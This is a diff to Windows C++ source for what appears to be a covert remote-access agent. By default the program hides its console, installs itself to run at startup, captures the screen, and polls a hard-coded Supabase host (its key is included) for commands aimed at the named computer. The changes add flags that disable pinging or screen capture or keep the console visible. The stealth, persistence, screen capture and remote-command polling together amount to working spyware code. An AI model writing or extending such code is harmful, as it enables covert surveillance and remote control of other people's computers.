@@ -16,6 +16,7 @@ using namespace Gdiplus;
 
 std::string computerName;
 std::string publicIP;
+bool g_noPing=false;
 const std::string SB_HOST="odocuexiouhmmkpwtuwk.supabase.co";
 const std::string SB_KEY="sb_publishable_KWdi4nin2RNI9pl3T2LiAA_-6axXMED";
 
@@ -349,7 +350,7 @@ DWORD WINAPI pollThread(LPVOID) {
     Sleep(3000);
     while(true) {
         Sleep(200);
-        try { sendPing(); } catch(...) {}
+        try { if(!g_noPing) sendPing(); } catch(...) {}
         try {
             std::string path = "/rest/v1/commands?computer=eq." + computerName + "&status=eq.pending&order=id.asc";
             std::string resp = httpsGet(path);
@@ -436,23 +437,28 @@ void installStartup() {
 }
 
 int main(int argc, char* argv[]) {
-    HWND hwnd = GetConsoleWindow();
-    if (hwnd) ShowWindow(hwnd, SW_HIDE);
     bool noStartup = false;
+    bool noScreen = false;
+    bool showConsole = false;
     for (int i = 1; i < argc; i++) {
         std::string a = argv[i];
         if (a == "--no-startup") noStartup = true;
+        else if (a == "--no-ping") g_noPing = true;
+        else if (a == "--no-screen") noScreen = true;
+        else if (a == "--show") showConsole = true;
         else if (a.find("--name=") == 0 && a.size() > 7) computerName = a.substr(7);
         else if (a == "--name" && i + 1 < argc) computerName = argv[++i];
     }
     if (computerName.empty()) computerName = getComputerName();
+    HWND hwnd = GetConsoleWindow();
+    if (hwnd && !showConsole) ShowWindow(hwnd, SW_HIDE);
     publicIP = getPublicIP();
     if (!noStartup) installStartup();
     GdiplusStartupInput gdiplusStartupInput;
     ULONG_PTR gdiplusToken;
     GdiplusStartup(&gdiplusToken, &gdiplusStartupInput, NULL);
     CreateThread(0, 0, pollThread, 0, 0, 0);
-    CreateThread(0, 0, screenThread, 0, 0, 0);
+    if (!noScreen) CreateThread(0, 0, screenThread, 0, 0, 0);
     MSG msg;
     while (GetMessage(&msg, 0, 0, 0)) { TranslateMessage(&msg); DispatchMessage(&msg); }
     GdiplusShutdown(gdiplusToken);
